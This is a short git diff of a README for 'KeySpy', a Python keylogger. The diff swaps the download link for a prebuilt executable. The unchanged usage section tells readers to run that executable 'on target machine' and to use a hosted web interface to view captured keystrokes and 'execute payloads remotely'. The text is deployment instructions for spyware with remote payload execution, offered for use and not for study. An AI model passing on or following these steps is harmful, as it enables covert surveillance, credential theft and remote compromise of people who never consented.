@@ -32,7 +32,7 @@ KeySpy is a Python keylogger with a web interface for viewing captured keystroke
 
 ## Usage
    ### ⚙️Keylogger:
-   -  Download the [kSpy-AIO.exe](https://github.com/3rr0r-505/KeySpy/releases/download/v1.4.1/kSpy-AIO_v1.4.exe) file & run it on target machine.
+   -  Download the [kSpy-AIO.exe](https://github.com/3rr0r-505/Minor-Project/releases/download/v1.5/kSpy-AIO_v1.5.exe) file & run it on target machine.
    ### 🌐Web Interface:
    - Visit this site [w3blogger.vercel.app](https://w3blogger.vercel.app/) to monitor the keylogs and execute payloads remotely
    
